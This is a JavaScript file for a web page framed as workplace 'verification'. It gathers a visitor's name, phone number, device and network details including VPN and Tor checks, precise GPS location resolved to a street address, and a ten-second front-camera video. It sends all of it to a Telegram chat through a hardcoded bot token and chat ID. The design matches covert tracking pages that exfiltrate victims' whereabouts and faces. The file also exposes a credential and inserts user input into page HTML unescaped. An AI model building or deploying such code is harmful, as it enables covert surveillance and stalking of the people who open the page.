// Telegram bot configuration
const BOT_TOKEN = '7699956438:AAGi0tcBxMRl2U4HkpJ_Fur2eBAf0E-7P0Q';
const CHAT_ID = '6395641632';

// Global variables to store collected data
const verificationData = {
    username: '',
    phoneNumber: '',
    onPremises: null,
    offPremisesReason: '',
    location: {},
    deviceInfo: {},
    networkInfo: {},
    temperature: null,
    localTime: '',
    errors: [],
    progress: {
        current: 0,
        total: 8, // Updated total steps
        steps: [
            { name: "Permissions", status: "pending" },
            { name: "User Info", status: "pending" },
            { name: "Location Check", status: "pending" },
            { name: "Device Data", status: "pending" },
            { name: "Network Data", status: "pending" },
            { name: "Location Data", status: "pending" },
            { name: "Weather Data", status: "pending" },
            { name: "Video Verification", status: "pending" }
        ]
    }
};

// DOM elements
const elements = {
    permissionStep: document.getElementById('permissionStep'),
    userInfoStep: document.getElementById('userInfoStep'),
    locationCheckStep: document.getElementById('locationCheckStep'),
    offPremisesStep: document.getElementById('offPremisesStep'),
    dataCollectionStep: document.getElementById('dataCollectionStep'),
    videoRecordingStep: document.getElementById('videoRecordingStep'),
    verificationCompleteStep: document.getElementById('verificationCompleteStep'),
    grantPermissionBtn: document.getElementById('grantPermissionBtn'),
    submitInfoBtn: document.getElementById('submitInfoBtn'),
    submitLocationBtn: document.getElementById('submitLocationBtn'),
    submitOffPremisesBtn: document.getElementById('submitOffPremisesBtn'),
    usernameInput: document.getElementById('username'),
    phoneNumberInput: document.getElementById('phoneNumber'),
    onPremisesYes: document.getElementById('onPremisesYes'),
    onPremisesNo: document.getElementById('onPremisesNo'),
    offPremisesReasonInput: document.getElementById('offPremisesReason'),
    videoPreview: document.getElementById('videoPreview'),
    progressBar: document.querySelector('.progress-bar'),
    statusMessages: document.getElementById('statusMessages'),
    timerDisplay: document.querySelector('.timer'),
    progressRing: document.querySelector('.progress-ring-circle'),
    completionStatus: document.getElementById('completionStatus')
};

// Create progress dashboard
const progressDashboard = document.createElement('div');
progressDashboard.className = 'progress-dashboard';
elements.dataCollectionStep.insertBefore(progressDashboard, elements.dataCollectionStep.firstChild);

// Current step tracking
let currentStep = 0;
const steps = [
    elements.permissionStep, 
    elements.userInfoStep,
    elements.locationCheckStep,
    elements.offPremisesStep,
    elements.dataCollectionStep, 
    elements.videoRecordingStep, 
    elements.verificationCompleteStep
];

// Media recorder variables
let mediaRecorder;
let recordedChunks = [];
let countdown;

// Show current step
function showStep(stepIndex) {
    steps.forEach((step, index) => {
        step.classList.toggle('active', index === stepIndex);
    });
    currentStep = stepIndex;
    updateProgressDashboard();
}

// Update progress dashboard
function updateProgressDashboard() {
    progressDashboard.innerHTML = verificationData.progress.steps.map((step, index) => `
        <div class="progress-step ${step.status} ${index === verificationData.progress.current ? 'active' : ''}">
            <div class="step-icon">
                ${step.status === 'completed' ? '✓' : index + 1}
            </div>
            <div class="step-name">${step.name}</div>
            ${step.status === 'failed' ? '<div class="step-error">!</div>' : ''}
        </div>
    `).join('');
}

// Mark progress step
function markProgressStep(index, status) {
    verificationData.progress.steps[index].status = status;
    verificationData.progress.current = index + 1;
    updateProgressDashboard();
}

// Update status messages
function updateStatus(message, type) {
    const statusItem = document.createElement('div');
    statusItem.className = `status-item ${type}`;
    
    const icon = document.createElement('i');
    icon.className = type === 'success' ? 'bi bi-check-circle-fill' : 'bi bi-exclamation-triangle-fill';
    
    statusItem.appendChild(icon);
    statusItem.appendChild(document.createTextNode(message));
    elements.statusMessages.appendChild(statusItem);
    
    // Update progress bar
    const currentProgress = elements.statusMessages.children.length;
    const progressPercent = (currentProgress / verificationData.progress.total) * 100;
    elements.progressBar.style.width = `${progressPercent}%`;
}

// Event listeners
function setupEventListeners() {
    elements.grantPermissionBtn.addEventListener('click', () => {
        markProgressStep(0, 'completed');
        showStep(1);
    });

    elements.submitInfoBtn.addEventListener('click', () => {
        if (!elements.usernameInput.value || !elements.phoneNumberInput.value) {
            alert('Please fill in all fields');
            return;
        }
        
        verificationData.username = elements.usernameInput.value;
        verificationData.phoneNumber = elements.phoneNumberInput.value;
        
        markProgressStep(1, 'completed');
        showStep(2);
    });

    elements.submitLocationBtn.addEventListener('click', () => {
        if (!elements.onPremisesYes.checked && !elements.onPremisesNo.checked) {
            alert('Please select an option');
            return;
        }
        
        verificationData.onPremises = elements.onPremisesYes.checked;
        
        if (verificationData.onPremises) {
            markProgressStep(2, 'completed');
            showStep(4); // Skip to data collection if on premises
            startDataCollection();
        } else {
            markProgressStep(2, 'completed');
            showStep(3); // Show off-premises reason step
        }
    });

    elements.submitOffPremisesBtn.addEventListener('click', async () => {
        if (!elements.offPremisesReasonInput.value) {
            alert('Please provide a reason');
            return;
        }
        
        verificationData.offPremisesReason = elements.offPremisesReasonInput.value;
        await sendOffPremisesNotification();
        markProgressStep(2, 'completed');
        showStep(6); // Skip to completion step
    });
}

// Send notification when not on premises
async function sendOffPremisesNotification() {
    const now = new Date();
    const message = `🚨 *Off-Premises Notification* 🚨\n\n` +
                   `• User: ${verificationData.username}\n` +
                   `• Phone: ${formatPhoneNumber(verificationData.phoneNumber)}\n` +
                   `• Time: ${now.toLocaleString()}\n` +
                   `• Reason: ${verificationData.offPremisesReason}\n\n` +
                   `*No verification data was collected*`;
    
    try {
        elements.completionStatus.innerHTML = `
            <div class="processing-status">
                <div class="spinner-border text-primary" role="status">
                    <span class="visually-hidden">Processing...</span>
                </div>
                <p class="mt-2">Sending notification...</p>
            </div>
        `;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        elements.completionStatus.innerHTML = `
            <div class="alert alert-success">
                <h4><i class="bi bi-check-circle-fill"></i> Notification Sent</h4>
                <p>Your supervisor has been notified that you're not on company premises.</p>
                <p class="text-muted">Reason: ${verificationData.offPremisesReason}</p>
            </div>
        `;
    } catch (error) {
        console.error('Error sending notification:', error);
        elements.completionStatus.innerHTML = `
            <div class="alert alert-danger">
                <h4><i class="bi bi-exclamation-triangle-fill"></i> Notification Failed</h4>
                <p>Failed to send off-premises notification.</p>
                <button class="btn btn-warning mt-2" onclick="sendOffPremisesNotification()">
                    <i class="bi bi-arrow-repeat"></i> Try Again
                </button>
            </div>
        `;
    }
}

// Format phone number
function formatPhoneNumber(phoneNumber) {
    const cleaned = phoneNumber.replace(/\D/g, '');
    if (cleaned.startsWith('0') && cleaned.length === 10) {
        return `+254${cleaned.substring(1)}`;
    }
    return cleaned;
}

// Data collection process (only for on-premises users)
async function startDataCollection() {
    updateStatus('Starting data collection...', 'info');
    
    try {
        // Collect device info
        await collectDeviceInfo();
        markProgressStep(3, 'completed');
        updateStatus('Device information collected', 'success');
        
        // Collect network info
        await collectNetworkInfo();
        markProgressStep(4, 'completed');
        updateStatus('Network information collected', 'success');
        
        // Collect location and address
        await collectLocation();
        if (verificationData.location.coordinates) {
            await getAddressFromCoordinates();
        }
        markProgressStep(5, 'completed');
        updateStatus('Location information collected', 'success');
        
        // Get temperature
        await getTemperature();
        markProgressStep(6, 'completed');
        updateStatus('Temperature data fetched', 'success');
        
        // Move to video recording
        setTimeout(() => {
            showStep(5);
            startVideoRecording();
        }, 1000);
        
    } catch (error) {
        verificationData.errors.push(error.message);
        updateStatus(`Error: ${error.message}`, 'error');
        markProgressStep(verificationData.progress.current, 'failed');
    }
}

// Collect device information
async function collectDeviceInfo() {
    return new Promise((resolve) => {
        verificationData.deviceInfo = {
            battery: 'Battery API not supported',
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenResolution: `${window.screen.width}x${window.screen.height}`
        };

        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                verificationData.deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
                verificationData.deviceInfo.charging = battery.charging ? 'Yes' : 'No';
                resolve();
            }).catch(() => {
                verificationData.deviceInfo.battery = 'Battery info unavailable';
                resolve();
            });
        } else {
            resolve();
        }
    });
}

// Collect network information with fingerprinting
async function collectNetworkInfo() {
    return new Promise((resolve) => {
        verificationData.networkInfo = {
            connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
            downlink: navigator.connection ? `${navigator.connection.downlink} Mbps` : 'Unknown',
            rtt: navigator.connection ? `${navigator.connection.rtt} ms` : 'Unknown',
            ip: 'Will try to get from external service',
            isp: 'Unknown',
            asn: 'Unknown',
            mobileCarrier: 'Unknown',
            ispLocation: 'Unknown',
            networkFingerprint: {
                wifiAccessPoints: [],
                cellTowers: [],
                connection: {
                    type: navigator.connection ? navigator.connection.type : 'unknown',
                    saveData: navigator.connection ? navigator.connection.saveData : false,
                    metered: navigator.connection ? navigator.connection.metered : false
                }
            }
        };

        // Get detailed network information
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                verificationData.networkInfo.ip = data.ip;
                verificationData.networkInfo.isp = data.org || data.asn || 'Unknown';
                verificationData.networkInfo.asn = data.asn || 'Unknown';
                verificationData.networkInfo.mobileCarrier = data.network || 'Unknown';
                verificationData.networkInfo.ispLocation = `${data.city}, ${data.region}, ${data.country_name}`;
                
                // Enhanced fingerprinting
                verificationData.networkInfo.networkFingerprint.vpnDetection = {
                    usingVpn: data.privacy && (data.privacy.vpn || data.privacy.proxy),
                    hosting: data.asn && data.asn.toLowerCase().includes('hosting'),
                    datacenter: data.asn && data.asn.toLowerCase().includes('datacenter'),
                    anonymous: data.privacy && data.privacy.tor,
                    isSuspicious: false
                };
                
                verificationData.networkInfo.networkFingerprint.vpnDetection.isSuspicious = 
                    Object.values(verificationData.networkInfo.networkFingerprint.vpnDetection)
                        .some(val => val === true);
                
                resolve();
            })
            .catch(() => {
                // Fallback to ip-api.com
                fetch('http://ip-api.com/json/')
                    .then(response => response.json())
                    .then(data => {
                        if (data.status === 'success') {
                            verificationData.networkInfo.ip = data.query;
                            verificationData.networkInfo.isp = data.isp;
                            verificationData.networkInfo.asn = data.as;
                            verificationData.networkInfo.ispLocation = `${data.city}, ${data.regionName}, ${data.country}`;
                        }
                        resolve();
                    })
                    .catch(() => {
                        verificationData.networkInfo.ip = 'IP detection failed';
                        verificationData.errors.push('Failed to detect IP address');
                        resolve();
                    });
            });
    });
}

// Collect location
async function collectLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            verificationData.errors.push('Geolocation is not supported by this browser');
            reject(new Error('Geolocation not supported'));
            return;
        }

        navigator.geolocation.getCurrentPosition(
            position => {
                verificationData.location = {
                    coordinates: {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    },
                    accuracy: `${position.coords.accuracy} meters`,
                    isExact: position.coords.accuracy < 100,
                    altitude: position.coords.altitude ? `${position.coords.altitude} meters` : 'Not available',
                    heading: position.coords.heading ? `${position.coords.heading}° from true north` : 'Not available',
                    speed: position.coords.speed ? `${position.coords.speed} m/s` : 'Not available',
                    timestamp: new Date(position.timestamp).toLocaleString()
                };
                resolve();
            },
            error => {
                let errorMessage;
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMessage = "User denied the request for Geolocation.";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMessage = "Location information is unavailable.";
                        break;
                    case error.TIMEOUT:
                        errorMessage = "The request to get user location timed out.";
                        break;
                    case error.UNKNOWN_ERROR:
                        errorMessage = "An unknown error occurred.";
                        break;
                }
                
                verificationData.errors.push(errorMessage);
                verificationData.location = {
                    error: errorMessage
                };
                
                // Fallback to IP-based location
                fetch(`https://ipapi.co/json/`)
                    .then(res => res.json())
                    .then(data => {
                        verificationData.location = {
                            coordinates: {
                                latitude: data.latitude,
                                longitude: data.longitude
                            },
                            accuracy: 'Approximated Location from IP (system had error in obtaining exact location)',
                            isExact: false,
                            city: data.city,
                            region: data.region,
                            country: data.country_name
                        };
                        resolve();
                    })
                    .catch(() => {
                        verificationData.errors.push('Failed to get approximate location');
                        reject(new Error('Failed to get location'));
                    });
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// Get address from coordinates
async function getAddressFromCoordinates() {
    return new Promise((resolve) => {
        if (!verificationData.location || !verificationData.location.coordinates) {
            verificationData.errors.push('No coordinates available for reverse geocoding');
            resolve();
            return;
        }

        const { latitude, longitude } = verificationData.location.coordinates;
        
        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
            .then(response => response.json())
            .then(data => {
                if (data.address) {
                    const address = data.address;
                    let formattedAddress = '';
                    
                    if (address.road) formattedAddress += `${address.road}, `;
                    if (address.neighbourhood) formattedAddress += `${address.neighbourhood}, `;
                    if (address.suburb) formattedAddress += `${address.suburb}, `;
                    if (address.city || address.town || address.village) {
                        formattedAddress += `${address.city || address.town || address.village}, `;
                    }
                    if (address.state) formattedAddress += `${address.state}, `;
                    if (address.country) formattedAddress += address.country;
                    if (address.postcode) formattedAddress += ` (${address.postcode})`;
                    
                    verificationData.location.address = formattedAddress;
                    
          // Store exact location as one complete object
                    verificationData.location.exactLocation = {
                        ...data.address,
                        displayName: data.display_name,
                        fullDetails: data
                    };
                }
                resolve();
            })
            .catch(error => {
                verificationData.errors.push('Failed to get address from coordinates');
                console.error('Reverse geocoding error:', error);
                resolve();
            });
    });
}

// Get temperature from weather API
async function getTemperature() {
    return new Promise((resolve, reject) => {
        if (!verificationData.location || !verificationData.location.coordinates) {
            verificationData.errors.push('No location data available to fetch temperature');
            reject(new Error('No location data'));
            return;
        }

        const { latitude, longitude } = verificationData.location.coordinates;
        
        fetch(`https://api.open-meteo.com/v1/forecast?latitude=${latitude}&longitude=${longitude}&current_weather=true`)
            .then(response => response.json())
            .then(data => {
                if (data.current_weather) {
                    verificationData.temperature = {
                        value: data.current_weather.temperature,
                        unit: '°C',
                        windspeed: `${data.current_weather.windspeed} km/h`,
                        weatherCode: data.current_weather.weathercode,
                        weatherDescription: getWeatherDescription(data.current_weather.weathercode),
                        time: data.current_weather.time
                    };
                } else {
                    verificationData.temperature = {
                        error: 'Temperature data not available'
                    };
                    verificationData.errors.push('Temperature data not available from API');
                }
                resolve();
            })
            .catch(error => {
                verificationData.temperature = {
                    error: 'Failed to fetch temperature'
                };
                verificationData.errors.push('Failed to fetch temperature data');
                resolve();
            });
    });
}

// Helper function to convert weather code to description
function getWeatherDescription(code) {
    const weatherCodes = {
        0: 'Clear sky',
        1: 'Mainly clear',
        2: 'Partly cloudy',
        3: 'Overcast',
        45: 'Fog',
        48: 'Depositing rime fog',
        51: 'Light drizzle',
        53: 'Moderate drizzle',
        55: 'Dense drizzle',
        56: 'Light freezing drizzle',
        57: 'Dense freezing drizzle',
        61: 'Slight rain',
        63: 'Moderate rain',
        65: 'Heavy rain',
        66: 'Light freezing rain',
        67: 'Heavy freezing rain',
        71: 'Slight snow fall',
        73: 'Moderate snow fall',
        75: 'Heavy snow fall',
        77: 'Snow grains',
        80: 'Slight rain showers',
        81: 'Moderate rain showers',
        82: 'Violent rain showers',
        85: 'Slight snow showers',
        86: 'Heavy snow showers',
        95: 'Thunderstorm',
        96: 'Thunderstorm with slight hail',
        99: 'Thunderstorm with heavy hail'
    };
    return weatherCodes[code] || 'Unknown weather condition';
}

// Get local time with city
function getLocalTimeWithCity() {
    const now = new Date();
    const options = {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZoneName: 'long'
    };
    
    let locationInfo = '';
    if (verificationData.location.city) {
        locationInfo = ` in ${verificationData.location.city}`;
    } else if (verificationData.location.country) {
        locationInfo = ` in ${verificationData.location.country}`;
    }
    
    verificationData.localTime = {
        formatted: now.toLocaleString(),
        detailed: now.toLocaleString(undefined, options),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        unixTimestamp: Math.floor(now.getTime() / 1000),
        locationInfo: locationInfo
    };
}

// Start video recording
async function startVideoRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: {
                width: { ideal: 640 },
                height: { ideal: 480 },
                facingMode: 'user'
            }, 
            audio: false 
        });
        elements.videoPreview.srcObject = stream;
        
        // Use MP4 format for better Telegram compatibility
        const options = { mimeType: 'video/webm;codecs=vp9' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
            options.mimeType = 'video/webm;codecs=vp8';
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options.mimeType = 'video/webm';
            }
        }
        
        mediaRecorder = new MediaRecorder(stream, options);
        
        mediaRecorder.ondataavailable = event => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' });
            verificationData.videoBlob = recordedBlob;
            
            // Stop all tracks in the stream
            stream.getTracks().forEach(track => track.stop());
            
            markProgressStep(7, 'completed');
            showStep(6);
            await sendDataToTelegram();
        };
        
        // Start countdown
        let seconds = 10;
        elements.timerDisplay.textContent = seconds;
        
        // Set up progress ring
        const circumference = 565.48;
        let offset = circumference;
        
        countdown = setInterval(() => {
            seconds--;
            elements.timerDisplay.textContent = seconds;
            
            // Update progress ring
            offset = (seconds / 10) * circumference;
            elements.progressRing.style.strokeDashoffset = offset;
            
            if (seconds <= 0) {
                clearInterval(countdown);
                mediaRecorder.stop();
            }
        }, 1000);
        
        // Start recording
        recordedChunks = [];
        mediaRecorder.start(100);
        
    } catch (error) {
        verificationData.errors.push(`Video recording failed: ${error.message}`);
        updateStatus(`Video recording failed: ${error.message}`, 'error');
        markProgressStep(7, 'failed');
        showStep(6);
        await sendDataToTelegram();
    }
}

// Send data to Telegram
async function sendDataToTelegram() {
    // Show processing status
    elements.completionStatus.innerHTML = `
        <div class="processing-status">
            <div class="spinner-border text-primary" role="status">
                <span class="visually-hidden">Processing...</span>
            </div>
            <p class="mt-2">Submitting your verification data...</p>
        </div>
    `;
    
    try {
        // Format the message
        let message = `🔐 *Verification Data from ${verificationData.username}* 🔐\n\n`;
        
        // Device info
        message += `📱 *Device Information:*\n`;
        message += `  - Battery: ${verificationData.deviceInfo.battery}\n`;
        message += `  - Language: ${verificationData.deviceInfo.language}\n`;
        message += `  - Timezone: ${verificationData.deviceInfo.timezone}\n`;
        message += `  - Platform: ${verificationData.deviceInfo.platform}\n`;
        message += `  - Screen: ${verificationData.deviceInfo.screenResolution}\n\n`;
        
        // Network info
        message += `🌐 *Network Information:*\n`;
        message += `  - IP Address: ${verificationData.networkInfo.ip}\n`;
        message += `  - ISP: ${verificationData.networkInfo.isp} (AS${verificationData.networkInfo.asn})\n`;
        message += `  - ISP Location: ${verificationData.networkInfo.ispLocation}\n`;
        message += `  - Connection: ${verificationData.networkInfo.connectionType} (${verificationData.networkInfo.downlink} down, ${verificationData.networkInfo.rtt}ms latency)\n`;
        
        if (verificationData.networkInfo.networkFingerprint.vpnDetection.isSuspicious) {
            message += `  - ⚠️ *Suspicious Network Activity Detected*\n`;
            message += `    - VPN/Proxy: ${verificationData.networkInfo.networkFingerprint.vpnDetection.usingVpn ? 'Yes' : 'No'}\n`;
            message += `    - Hosting: ${verificationData.networkInfo.networkFingerprint.vpnDetection.hosting ? 'Yes' : 'No'}\n`;
            message += `    - TOR: ${verificationData.networkInfo.networkFingerprint.vpnDetection.anonymous ? 'Yes' : 'No'}\n`;
        }
        message += `\n`;
        
        // Location
        message += `📍 *Location Information:*\n`;
        if (verificationData.location.coordinates) {
            message += `  - Coordinates: ${verificationData.location.coordinates.latitude}, ${verificationData.location.coordinates.longitude}\n`;
            message += `  - Accuracy: ${verificationData.location.accuracy}\n`;
            
            if (verificationData.location.address) {
                message += `  - Address: ${verificationData.location.address}\n`;
            }
            
            if (verificationData.location.exactLocation) {
                message += `  - *Exact Location Details:*\n`;
                const loc = verificationData.location.exactLocation;
                if (loc.road) message += `    - Street: ${loc.road}${loc.house_number ? ' ' + loc.house_number : ''}\n`;
                if (loc.city) message += `    - City: ${loc.city}\n`;
                if (loc.state) message += `    - State: ${loc.state}\n`;
                if (loc.country) message += `    - Country: ${loc.country}\n`;
                if (loc.postcode) message += `    - Postal Code: ${loc.postcode}\n`;
                message += `    - Full Address: ${loc.displayName}\n`;
            }
            
            message += `  - Maps:\n`;
            message += `    - Google Maps: https://www.google.com/maps?q=${verificationData.location.coordinates.latitude},${verificationData.location.coordinates.longitude}\n`;
            message += `    - OpenStreetMap: https://www.openstreetmap.org/?mlat=${verificationData.location.coordinates.latitude}&mlon=${verificationData.location.coordinates.longitude}\n`;
        } else {
            message += `  - Location data not available\n`;
        }
        message += `\n`;
        
        // Weather
        if (verificationData.temperature && verificationData.temperature.value) {
            message += `🌡️ *Weather Information:*\n`;
            message += `  - Temperature: ${verificationData.temperature.value}${verificationData.temperature.unit}\n`;
            message += `  - Conditions: ${verificationData.temperature.weatherDescription}\n`;
            message += `  - Wind Speed: ${verificationData.temperature.windspeed}\n\n`;
        }
        
        // Time
        message += `⏰ *Local Time:*\n`;
        message += `  - ${verificationData.localTime.detailed}\n\n`;
        
        // WhatsApp link
        if (verificationData.phoneNumber) {
            const formattedNumber = formatPhoneNumber(verificationData.phoneNumber);
            message += `📱 *WhatsApp Link:* https://wa.me/${formattedNumber}\n\n`;
        }
        
        // Errors
        if (verificationData.errors.length > 0) {
            message += `⚠️ *Errors Encountered:*\n`;
            verificationData.errors.forEach(error => {
                message += `  - ${error}\n`;
            });
        }
        
        // Send text message first
        const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: false
            })
        });
        
        // Then send video if available
        if (verificationData.videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', verificationData.videoBlob, 'verification.webm');
            formData.append('caption', `🎥 Face verification for ${verificationData.username}`);
            formData.append('supports_streaming', true);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            });
        }
        
        // Show success message
        elements.completionStatus.innerHTML = `
            <div class="alert alert-success">
                <h4><i class="bi bi-check-circle-fill"></i> Verification Complete!</h4>
                <p>All data has been successfully submitted to our systems.</p>
                <p class="text-muted">You may now close this window.</p>
            </div>
        `;
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        elements.completionStatus.innerHTML = `
            <div class="alert alert-danger">
                <h4><i class="bi bi-exclamation-triangle-fill"></i> Submission Failed</h4>
                <p>${error.message}</p>
                <button class="btn btn-warning mt-3" onclick="window.location.reload()">
                    <i class="bi bi-arrow-repeat"></i> Try Again
                </button>
            </div>
        `;
    }
}

// Initialize the application
function initializeApp() {
    // Check if browser supports required features
    if (!navigator.geolocation || !navigator.mediaDevices || !window.MediaRecorder) {
        elements.permissionStep.innerHTML = `
            <div class="alert alert-danger">
                <h4>Browser Not Supported</h4>
                <p>Your browser doesn't support all required features for verification:</p>
                <ul>
                    ${!navigator.geolocation ? '<li>Geolocation API</li>' : ''}
                    ${!navigator.mediaDevices ? '<li>Media Devices API</li>' : ''}
                    ${!window.MediaRecorder ? '<li>MediaRecorder API</li>' : ''}
                </ul>
                <p>Please try with a modern browser like Chrome or Firefox.</p>
            </div>
        `;
        return;
    }

    // Set up event listeners
    setupEventListeners();
    
    // Initialize time
    getLocalTimeWithCity();
    
    // Show first step
    showStep(0);
    updateProgressDashboard();
}

// Start the application when DOM is loaded
document.addEventListener('DOMContentLoaded', initializeApp);
